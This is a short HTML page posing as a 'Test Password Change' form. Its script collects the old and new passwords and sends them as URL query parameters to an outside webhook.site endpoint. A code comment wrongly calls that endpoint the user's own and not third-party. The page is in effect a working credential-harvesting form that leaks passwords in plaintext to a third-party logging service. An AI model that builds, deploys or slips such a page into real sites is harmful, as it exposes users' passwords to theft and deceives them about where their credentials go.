<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Test Password Change</title>
</head>
<body>

<h2>Change Password (Testing)</h2>

<form id="pwdForm">
  <label>Old Password:</label><br>
  <input type="password" id="oldPwd" required><br><br>

  <label>New Password:</label><br>
  <input type="password" id="newPwd" required><br><br>

  <button type="submit">Submit</button>
</form>

<script>
document.getElementById("pwdForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const oldPwd = encodeURIComponent(document.getElementById("oldPwd").value);
  const newPwd = encodeURIComponent(document.getElementById("newPwd").value);

  // Redirect to YOUR OWN test endpoint (not third-party)
  const url = `https://webhook.site/1092dc88-896c-4d14-840f-b06909f466c2?old_password=${oldPwd}&new_password=${newPwd}`;

  window.location.href = url;
});
</script>

</body>
</html>
